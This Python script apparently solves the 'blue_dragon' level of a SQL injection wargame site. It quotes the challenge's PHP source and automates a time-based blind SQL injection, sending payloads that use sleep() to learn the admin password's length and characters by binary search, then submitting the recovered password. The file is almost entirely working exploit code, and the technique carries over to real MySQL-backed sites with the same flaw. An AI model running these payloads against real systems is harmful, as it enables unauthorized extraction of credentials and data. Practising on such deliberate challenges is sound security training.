#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check time for request
    args[2]: time before request
    args[1]: time after request
    """
    return args[2] - args[1] > 4


def main():
    """
    Blue_dragon 27

    Time-based Blind injection

    if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

    $_GET[pw] = addslashes($_GET[pw]);
    $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
    """

    url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': 'admin'}

    payload = "' or id='admin' and if(length(pw)<%s,sleep(3),0)#"
    p = los.SqlInjection(url, cook, method, inj_param, payload,
                         other_param=other_param)
    len_of_key = p.find_key_len(check_func)

    p.payload = f"' or id='admin' and if(ord(mid(pw,%d,1))<%s,sleep(5),0)#"
    result = p.find_binary(check_func, len_of_key)

    p.payload = result
    response = p.my_request()

    if 'Clear!' in response:
        print('\nBlue_dragon Clear!')


if __name__ == '__main__':
    main()
